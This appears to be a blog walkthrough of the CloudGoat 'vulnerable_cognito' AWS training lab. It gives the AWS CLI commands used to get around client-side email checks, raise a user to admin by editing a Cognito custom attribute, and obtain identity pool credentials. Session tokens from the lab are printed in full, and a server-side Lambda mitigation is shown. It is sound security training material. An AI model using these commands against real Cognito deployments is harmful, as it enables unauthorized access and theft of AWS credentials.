# CloudGoat Scenario 2: vulnerable_cognito (Small / Moderate): WalkThrough and Mitigation

Hey hi, Soumyanil is back but with Cloud now, let’s have a look into AWS Penetration Testing. I will be covering all the scenarios provided by the CloudGoat vulnerable AWS environment by Rhinosecurity Labs.

**CloudGoat** is **Rhino Security Labs**’ “_Vulnerable by Design_” AWS deployment tool. It allows us to hone our cloud cybersecurity skills by creating and completing several **CTF** style scenarios. Each and every scenario is composed of AWS resources arranged together to create a structured learning experience. These scenarios vary in difficulty and many offer multiple paths to Flag/Goal.

From ***Purple Team point of View***:\
i. Our mission to perform Recon, identify vulnerabilities, and perform exploitation in order to achieve the scenario objective.\
ii. Provide Mitigation for the above Flaw that we came accross.

### <ins>Details about the Scenario :</ins>

![exploitation_route](https://github.com/reveng007/blog/assets/61424547/942a0abd-0a35-44e0-af70-d237b8145be9)

i. In this scenario, you are presented with a signup and login page with AWS Cognito in the backend.\
ii. You need to :\
&nbsp;&nbsp;Objective A. ***Bypass restrictions*** \
&nbsp;&nbsp;Objective B. ***Exploit Misconfigurations in Amazon Cognito*** in order :\
&nbsp;&nbsp;&nbsp;&nbsp;1. ***To Elevate your privileges***\
&nbsp;&nbsp;&nbsp;&nbsp;2. ***and get Cognito Identity Pool credentials***

iii. Scenario Resources: \
&nbsp;&nbsp;&nbsp;&nbsp;1 S3 bucket \
&nbsp;&nbsp;&nbsp;&nbsp;1 Cognito Userpool \
&nbsp;&nbsp;&nbsp;&nbsp;1 Cognito IdentityPool \
&nbsp;&nbsp;&nbsp;&nbsp;1 API Gateway REST API \
&nbsp;&nbsp;&nbsp;&nbsp;1 Lambda \
&nbsp;&nbsp;&nbsp;&nbsp;1 IAM role

I will be using Kali Linux VM to Spin Up the Vulnerable Lab Setup.

### CloudGoat SetUp:

To install [CloudGoat](https://github.com/RhinoSecurityLabs/cloudgoat/):
```bash
git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat
pip3 install -r ./requirements.txt
chmod +x cloudgoat.py
```
### NOTE:
Please setup the AWS CLI and AWS account prior to the above commands and create a user with name “cloudgoat” having permission for CLI connections.

### 1. Setting Up Scenario 2: vulnerable_cognito (Small / Moderate):
```bash
./cloudgoat.py create vulnerable_cognito
```
![](https://github.com/reveng007/reveng007.github.io/blob/main/CloudGoat/2.Scenarios-vulnerable_cognito%20(Small%20or%20Moderate)/1.ScenarioSetUp.png?raw=true)

![](https://github.com/reveng007/reveng007.github.io/blob/main/CloudGoat/2.Scenarios-vulnerable_cognito%20(Small%20or%20Moderate)/2.ScenarioSetUp.png?raw=true)



Q. BTW, What is **Amazon Cognito** ? \
Ans: According to [AWS](https://docs.aws.amazon.com/cognito/latest/developerguide/what-is-amazon-cognito.html):

![](https://github.com/reveng007/reveng007.github.io/blob/main/CloudGoat/2.Scenarios-vulnerable_cognito%20(Small%20or%20Moderate)/3.AmazonCognito.png?raw=true)

> So basically, **Amazon Cognito** is a User Identity and Data Syncronization Service, which gives User a very easy time to manage their accounts connected Over Mutiple Electronic Devices. 

### Let's Start:

```bash
┌──(kali㉿kali)-[~/AWS/BLOG_AWS/cloudgoat]
└─$ cat vulnerable_cognito_cgidgxpcecu5yc/start.txt 

apigateway_url = https://ht0ueqmd17.execute-api.us-east-1.amazonaws.com/vulncognito/cognitoctf-vulnerablecognitocgid2jkmefusdh/index.html
cloudgoat_output_aws_account_id = 572769290600
```

Let's Navigate to the site and signing up:

![image](https://github.com/reveng007/blog/assets/61424547/9a63d938-79fc-42fa-a4f1-05ac6cef5642)

Now using [temp-mail](https://temp-mail.org/en/), I tried to Sign-Up but I failed!

![](https://github.com/reveng007/reveng007.github.io/blob/main/CloudGoat/2.Scenarios-vulnerable_cognito%20(Small%20or%20Moderate)/5.SignUpEmailValidationError.png?raw=true)

### <ins>***Objective A: Bypassing email (client-side validation Check) restrictions***</ins>:

#### 1. Inspecting Source code of Webpage:

![image](https://github.com/reveng007/blog/assets/61424547/eb805432-0ac9-4897-8d2e-1aea2eb17721)

Got this Creds:
```bash
UserPoolId: 'us-east-1_mYaVxhwr7'
ClientId: '4u4i11pmknfa2k6flrur6c3a5v'
```

#### 2. Bypassing email Client-Side validation Checks/ restrictions via AWS CLI:

Let us use this _retireved_ `ClientId` to SignUp Via AWS CLI, which would bypass _`email Client-Side validation Check/restriction`_.

```bash
aws cognito-idp sign-up --client-id [Client-id] --username [temp-mail email address] --password [add-password] --region [region] --user-attributes '[{"Name":"given_name","Value":"lorem"},{"Name":"family_name","Value":"ipsum"}]'
```

```bash
┌──(kali㉿kali)-[~/AWS/BLOG_AWS/cloudgoat]
└─$ aws cognito-idp sign-up --client-id 4u4i11pmknfa2k6flrur6c3a5v --username yeripan911@bitofee.com --password Passw0rd! --region us-east-1 --user-attributes '[{"Name":"given_name","Value":"lorem"},{"Name":"family_name","Value":"ipsum"}]'
{
    "UserConfirmed": false,
    "CodeDeliveryDetails": {
        "Destination": "y***@b***",
        "DeliveryMedium": "EMAIL",
        "AttributeName": "email"
    },
    "UserSub": "3072f385-94fb-4eff-8371-829f7610af7e"
}
```

Got the Verfication code here in [temp-mail](https://temp-mail.org/en/):

![image](https://github.com/reveng007/blog/assets/61424547/be639a28-d5b6-4695-baf6-ce8fc003f299)

Now, confirming the registration:

```bash
aws cognito-idp confirm-sign-up --region [region] --client-id [ClientId] --username [temp-mail email address] --confirmation-code '[Verfication code in temp mail]'
```

![image](https://github.com/reveng007/blog/assets/61424547/13bafeef-be9b-475f-be2b-61a4f63e4805)

#### 3. Logging in now : [[TA0001](https://attack.mitre.org/tactics/TA0001/) - Initial Access]:

![image](https://github.com/reveng007/blog/assets/61424547/9b52c5c1-d464-4b0e-8361-0e9ab9e6d5c0)

![image](https://github.com/reveng007/blog/assets/61424547/82bac71b-71f6-4a64-8aa9-62016d5f5ee1)

### <ins>***Objective B. Exploit Misconfigurations in Amazon Cognito***</ins>: [[T1134](https://attack.mitre.org/techniques/T1134/) - PrivEsc: Access Token Manipulation]:

#### 1. With Inspect option, got some tokens stored in Storage Menu:

![image](https://github.com/reveng007/blog/assets/61424547/54d14ac6-f971-4e21-a6fd-d8eb888fc20a)

```bash
accessToken :
eyJraWQiOiJGZzVTQWdsclBCczVxcEVLamhnVUhoTVdETGRzUXhQVzZSMzIyZG9pS2V3PSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiIzMDcyZjM4NS05NGZiLTRlZmYtODM3MS04MjlmNzYxMGFmN2UiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV9tWWFWeGh3cjciLCJjbGllbnRfaWQiOiI0dTRpMTFwbWtuZmEyazZmbHJ1cjZjM2E1diIsIm9yaWdpbl9qdGkiOiIyYzIxZDM3OS0wN2M2LTQ3YjUtYTRhZC02ZjJjZTZjM2RlMzEiLCJldmVudF9pZCI6ImVlNjFmOGI3LTI2NTAtNDgyZS05ZDJiLWFhMTlhNTk2YTFiZCIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3MDY2MDU1MjgsImV4cCI6MTcwNjY2NjcxNSwiaWF0IjoxNzA2NjYzMTE1LCJqdGkiOiI1OTU4M2NjNC00YThmLTQ0NjYtODE0MS00YmE5ZGJlZjMwNTYiLCJ1c2VybmFtZSI6IjMwNzJmMzg1LTk0ZmItNGVmZi04MzcxLTgyOWY3NjEwYWY3ZSJ9.lzhDLHO9VjNCm_hqxc_VPQEXIZEK9GB5tlf3gS_PQaE_cKRFZot-vS1fFSsd3LWGYJG70ojjHj1N8HLHvMFWO94OCP6czBK-3BAq3zTA3bZ9PNTPITt34iefngx03CK6xSR6omTS3AmAStAnchSpOw457MK7mBgS5f-IWNAfLQW0hb4MkXE6LfVeCfzfG4Ur_rfWIm8j6kIVnvtSDzIj894e262BXvVI83xCEqSqgr2Svptc2Td2GN5pNX4FTaYgF0tBFtFA8AiRu6Sf2Jehh8QUC-_ZMoM4-piqk6WqOSJGlNrzHuLpn_tbf0YZgaskYmKIkAseXYiz5tN13Ywq5g

idToken : 
eyJraWQiOiI3N2JsaEwrYjBwaTNYSzlOVG9UQUFxeGdObVZMUmxFRVBjRVRIbUMzQUpnPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiIzMDcyZjM4NS05NGZiLTRlZmYtODM3MS04MjlmNzYxMGFmN2UiLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiaXNzIjoiaHR0cHM6XC9cL2NvZ25pdG8taWRwLnVzLWVhc3QtMS5hbWF6b25hd3MuY29tXC91cy1lYXN0LTFfbVlhVnhod3I3IiwiY29nbml0bzp1c2VybmFtZSI6IjMwNzJmMzg1LTk0ZmItNGVmZi04MzcxLTgyOWY3NjEwYWY3ZSIsImdpdmVuX25hbWUiOiJsb3JlbSIsImN1c3RvbTphY2Nlc3MiOiJyZWFkZXIiLCJvcmlnaW5fanRpIjoiYWFjNzYwNDItNmJkZi00Yjg2LWJhMzMtNWYxNTViMjQ5MzM1IiwiYXVkIjoiNHU0aTExcG1rbmZhMms2ZmxydXI2YzNhNXYiLCJldmVudF9pZCI6IjUyOGY0NWIxLTg3MGQtNGVmNC1hOWY2LTEwNWQ0MDIzNmU2NCIsInRva2VuX3VzZSI6ImlkIiwiYXV0aF90aW1lIjoxNzA2NjA0MDkyLCJleHAiOjE3MDY2MDc2OTIsImlhdCI6MTcwNjYwNDA5MiwiZmFtaWx5X25hbWUiOiJpcHN1bSIsImp0aSI6ImY0OTljMmFkLTk5NTQtNGJhMC05Yzg2LWVlYWJlNjRiOTVkYiIsImVtYWlsIjoieWVyaXBhbjkxMUBiaXRvZmVlLmNvbSJ9.n2qxAqrVu4ibtvi326vglqY6o-WoII_gRAANt7SbkpnBXvPRkBsypKBM_pVjIXAKoNsjBOyKrb8AC6oPpSiEHkxPfFCmfCDFD_WFQcSIxn-DONjorCZmF8nkq56cPQdI_VrQbuxZyrxOVE_nNjN393oNs2ow2lj8G8nQoorOd7uU4L3dYfk7Ip1YsZReXU-93cM6la8heRET-eS5xS_uMIXk9NQwxf5oFCyuQbK4rNJTUfF7C2IAXcS5hJs22sNseV9wDOsUAuZjnsUFj4HnYQTBpJgVUiZFNRJ71585TBTJtpW-7OAMq3N9qpSrs7MbpVVOtKBzJ1KewLemBALq1Q

refreshToken : 
eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAifQ.VThqXR3jTXZXvHN8XBhPaZZPyvj4bOi6F7S_GMt37_TtcDcpbJ60u8gv5v8uG48GX9woHis7w-ma0FE_gNTSB6cETcYM-If1K_eC3_AiGSyI3vEkqmDtiZtgKaF26eDN-8k1di5mO4w2oYE9uG6L91YPdwUTA8do9WIo1bp7WVJwqFeS1jHKt8h9xmHoeUk4lpQodyWO_92EzBPyr5VRvohjXQ1EL2K8BtWIwvPfGZ1zumKcrhALnUR0lCtYgiFUcWg0iyrli58a2NQbAHW9iLeNo1XU4Kghj5FBFm4seP3tQXzWjK4A5TkWai2ZglOx3RPHieR1JiAhblPohb5gnA.xffrQ7sx_oHI6FRh.M9AvkGOSW4OFWRUuLmbKaeJb8LoNpTNnQlxPL4PP_5aJ7-5hJJPb_GYPVLUUSmDKrbWi1E8qt7A0iTSJnk5M3nUJuOHWVVKQ4tmKutTVQ0aY2STDUtUXu3iIbav4dwUyW5Hg5BDm_G9B8HE0RlkspY6dUrmn7qIFN3zsl4N9qAb3WPLyTsgj1BxfS3YSDrLL2XGBuBxlJ3Wft_s-r_setAwlLfzB4OAR0OM8piYWuDEIVKVokvR5JXz3jmQmpm-5I8pFEgG02x9WyvVCW3bZTabqICRZw2jUHVDv1dWVYG8xdEBmalhHMzDEP0WUY_ZKq7xnEMzUa6OgCnlMvMeePuOgnSfI48h-4UTgRYShbZJpOPlXkc43csYzGKIWBA_SmRMtDjdT6VwqwLzpDgPablhADVsnuFiXUi6yD6gEr_U8VxStNRrjmGWT59QzayyLOPu6Mnf9LLbsFybNIBr05JJ6gFkWR_8Tcjm1pS8287grUTiOpJ8svA1oAoiWyuvBdI2IC3RGllc7ZdLe6OCF01Abo9gDjr_1x1ebSAhsI7Ruzngn2Y_Uvkg78S3fAs0l-i4g4tj8oQ5fGa7qfvA_i64xpJvsHmYCFznxNxztZJriilY6AFcXRZ04vddKWiqBKz1BleVV2JN-sqqCkUr72i6LwaIm7UR4mqp-QiScurfaxOJdhEET_n7Rw-9iBlQuMD914L8pc6W-LBFuyeVj3M7V0aTXBDLpeRObow66AL7Ji_cGWYYlZmkYxAMIabdfhvNTZeH6KDqrCtDYWSmOe6CgkG0jffb_WnErLfcJtjf747xvwLrcs5kVGggf_sUE7LL9sr3OqHfe9hBd4gxaLSbD00WN7r5nKjLVadFXUhb288DmRE0sc1BfbLLYB7beewbdHHHKWew8ZtbzZm2dlv51G6wpdmc3AmNWLP0wHFnChD_LGDIVLugORY4FVBUe7qRtrYyPJ0v-XOcclF3VZcXSxxbExAFiCMiYJ6ut6HiMr0xF1vdMj94iFbJ26h7jwRBhr2S6nlVrONwajf9YcAddWlMtnDumfhTrK-57nlPCuEsQrlUCqcA5hPiCuWR5G5gchU76Z_PqxQbwp8TIWMd6uVtbYaDnmWuGdtfzZ_ohHU3y3ip5XF7ZgilQuYwjjfVeYbDw5_QDCRdOS4nbe5vIiVUwBC5vKHYWHdmDbfgRFcYL-KxvCHhXx7fDMrTBXPGvc5xaLQtx27FO2I0hNtYQRFvpiefF79B3UbaAWm7GdSma-wKi98q6eXKA73fpiTAqqb5yI2CT-t5-PKMCj7mh51H-mDa1r7uqwyrI2W190oXXWOvpAeIO7b8.s5OPY_91iz_kTjtNqKGztQ

LastAuthUser : 
3072f385-94fb-4eff-8371-829f7610af7e
```

#### 2. With the `accessToken`, I can perform PrivEsc: <ins>B.1. ***To Elevate our privileges***</ins>:

Let's check which users can actually use this retrieved `Access Token`:

```bash
aws cognito-idp get-user --access-token [AccessToken]
```

![image](https://github.com/reveng007/blog/assets/61424547/3a6ae0f5-672a-4f31-a0ec-6b39e671b082)

We can see that these are all data, last one is our own signing up data. All these datas within **`UserAttributes`** parameter are added by Amazon **Cognito** using a [***post-confirmation lambda trigger***](https://docs.aws.amazon.com/cognito/latest/developerguide/user-pool-lambda-post-confirmation.html)

But there is one which looks different than the rest of the members : ***custom attribute “custom:access”***

- In Amazon Cognito, [custom user attributes](https://docs.aws.amazon.com/cognito/latest/developerguide/user-pool-settings-attributes.html#user-pool-settings-custom-attributes) are used for **better management of users**. 

- Custom User attributes lies under the category of [**Role-based access control**](https://docs.aws.amazon.com/cognito/latest/developerguide/role-based-access-control.html).
- Custom attributes require the `custom:` prefix to distinguish them from _standard attributes_.
- These custom attributes are important and mostly overlooked in terms of security.

#### NOTE:
Q. What is Role-based Access control?
> Amazon Cognito identity pools assign authenticated IAM users a set of temporary, limited-privilege credentials to access your AWS resources. The permissions for each user are controlled through [IAM roles](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html) (A secure way to grant permissions to Entities/IAM Users we trust) that you create.

Basically, it provides limited access to a particular AWS resource by WhiteListing selective IAM users.

We are now trying to update the “**custom:access**” attribute to “admin” rights using AWS CLI:

```bash
aws cognito-idp update-user-attributes --region [region] --access-token [AccessToken] --user-attributes '[{"Name":"custom:access","Value":"admin"}]'
```

![image](https://github.com/reveng007/blog/assets/61424547/26906b11-f0b4-468c-a548-c92f1a4380de)

Let's check this:

![image](https://github.com/reveng007/blog/assets/61424547/fff2e263-6e3b-4333-92c9-b2ca9b42f75b)

> So, we are admin now!

#### 3. Objective B.2. ***get Cognito Identity Pool credentials***:

Let's check the Source again now for admin account (_admin.html_):

![image](https://github.com/reveng007/blog/assets/61424547/038e4567-3a44-4600-bf9a-9880b08bfa9f)

```bash
IdentityPoolId: us-east-1:020af0e2-d0e0-46cd-9602-346d98689753
another value within Logins (not any particular keyword, just made that up for convinience) : cognito-idp.us-east-1.amazonaws.com/us-east-1_mYaVxhwr7 (cognito-idp.{region}.amazonaws.com/{UserPoolId}) 
```

#### Now let's retrieve, _`IdentityId`_:

> `IdentityPoolId` + `UserPoolId` + `idToken` (we previously retrieved from Local Storage of Browser) = `IdentityId`

Previously when we checked the Source Code of the _reader.html_ site : \
```bash
UserPoolId: 'us-east-1_mYaVxhwr7'
ClientId: '4u4i11pmknfa2k6flrur6c3a5v'
```

_`Another value within Logins`_ can be used directly to construct the AWS CLI command to retrieve, _`IdentityId`_:

```bash
aws cognito-identity get-id --identity-pool-id '[IdentityPool_Id]' --logins "another value within Logins={idToken}" --region [region] 
```
Or,
```bash
aws cognito-identity get-id --identity-pool-id '[IdentityPool_Id]' --logins "cognito-idp.{region}.amazonaws.com/{UserPoolId}={idToken}" --region [region] 
```

![image](https://github.com/reveng007/blog/assets/61424547/9b1064ef-8395-4b11-8fd6-dcf876c701c9)

```bash
IdentityId : us-east-1:b41e526f-7f65-47c3-bf18-38fd17f2192a
```

#### Retrieving AWS credentials from IdentityId :

> `IdentityId` + `UserPoolId` + `idToken` (we previously retrieved from Local Storage of Browser) = AWS credentials!!!

```bash
aws cognito-identity get-credentials-for-identity --identity-id '{IdentityId}' --logins "another value within Logins={idToken}" --region [region] 
```
Or,
```bash
aws cognito-identity get-credentials-for-identity --identity-id '{IdentityId}' --logins "cognito-idp.{region}.amazonaws.com/{UserPoolId}={idToken}" --region [region] 
```

![image](https://github.com/reveng007/blog/assets/61424547/4f2d7c16-e17c-460b-9979-666351797f00)


#### Post Exp Using [enumerate-iam](https://github.com/andresriancho/enumerate-iam):

```bash
enumerate-iam.py --access-key [retrieved AccessKeyId] --secret-key [SecretKey] --session-token [SessionToken] --region [region]
```

![image](https://github.com/reveng007/blog/assets/61424547/48956b41-6ea1-4de8-bad4-f8cb032d06d0)


### Security Mitigation for the above Misconfigurations:

1. Storing Sensitive IDs in Source Code is not allowed!
2. Using "***pre-sign-up lambda triggers***” to perform server-side email domain validation instead of using client-side validation.

#### Let's Set this Up:
##### 1. Creating a new Lambda function in the AWS Lambda console.

![image](https://github.com/reveng007/blog/assets/61424547/69bdc9e3-202a-4c02-860d-f3faa4ad2c2a)

![image](https://github.com/reveng007/blog/assets/61424547/c617ac75-dddf-4d25-9488-827ed4d30072)

Then, Click on "Create function"!

![image](https://github.com/reveng007/blog/assets/61424547/1544bb3d-9367-4d45-bbfa-115384f69f56)

The code will Look Like this:
```javascript
export const handler = async (event, context) => {
    try {
        // Configure the email domain that will be allowed to automatically verify.
        // in this case: approveddomain.com will be ecorp.com
        //const approvedDomain = "approveddomain.com";
        const approvedDomain = "ecorp.com";
        
        // Log the event information for debugging purposes.
        console.log('Received event:', JSON.stringify(event, null, 2));

        // Extract email from the request
        const email = event.request.userAttributes.email;

        // Validate the email domain
        if (!email.endsWith('@' + approvedDomain)) {
            // Reject the signup if the domain is not allowed
            throw new Error('Invalid email domain. Sign-up not allowed.');
        }

        // Continue with the sign-up process if the email domain is allowed
        event.response.emailSubject = "Signup Verification Code";
        event.response.emailMessage = "Thank you for signing up. " + event.request.codeParameter + " is your verification code.";
        context.done(null, event);
    } catch (error) {
        console.error('Error:', error.message);
        context.done(error, event);
    }
};
```

After Pasting, click the `Deploy Button`:

![image](https://github.com/reveng007/blog/assets/61424547/2967b826-5350-4b58-b007-c9e19f32aacf)

##### 2. We will now add "Pre-SignUp Lambda Trigger" : using the created _LambdaTrigger_ function to the already Present Cognito Service.

![image](https://github.com/reveng007/blog/assets/61424547/afb4debe-46ae-431f-97c1-b4d1ba455cbf)

Click on the running Cognito Service/Instance:

![image](https://github.com/reveng007/blog/assets/61424547/11851fd2-c1f6-4968-a9d3-88b148a8aad4)

##### 3. Choose the Cognito User Pool Properties Tab:

![image](https://github.com/reveng007/blog/assets/61424547/cd5f43d1-8945-42e1-ae75-d263bac7721c)

##### 4. Adding Pre-Signup Lambda Trigger:

![image](https://github.com/reveng007/blog/assets/61424547/dfc1b0f2-727e-481f-9e4d-317234b6229a)

Finally Click on "Add Lambda Trigger"

![image](https://github.com/reveng007/blog/assets/61424547/091521b3-c2d4-46ef-aaf6-28eb7cd9cc17)

We will see that Everything is Set!

![image](https://github.com/reveng007/blog/assets/61424547/425eadf5-b95a-4af2-a1c2-39560ddd6333)

Let's try to Bypass this Now:

1. Via GUI Website and AWS CLI consecutively:

![image](https://github.com/reveng007/blog/assets/61424547/d879df1b-17d3-48d8-b06b-ec1dfbb73319)

![image](https://github.com/reveng007/blog/assets/61424547/4e719ef6-4bb1-4559-bb98-3ad4b3a0ab38)

Working Successfully then :)

#### BTW, Destroy the scenario after completion of this lab:

1. Delete the Lambda Function named, **LamdaTrigger**.

![image](https://github.com/reveng007/blog/assets/61424547/ef189996-138c-4f2a-a2ab-c469de57ef2d)

2. Destroy the actually Env now with terraform script:
```bash
./cloudgoat.py destroy vulnerable_cognito
```

--------------------------------------------

#### New KeyWords that we learnt (can be used as Keyword Searching (Ctrl+F) if needed anytime) in this blog :
1. Amazon Cognito
2. [cognito-idp](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/)
3. post-confirmation lambda trigger
4. custom attribute “custom:access”
5. Role-based access control
6. IAM Role
7. Other value within Logins
8. Creating a new Lambda function
9. Pre-SignUp Lambda Trigger

--------------------------------------------

With this, I have come to the end of the blog. I will be uploading the rest of the CloudGoat Scenarios as soon as I finish them covering myself in lab env. If you guys/gals have any query, you can reach me at any of my social media. Till then, see yaa!

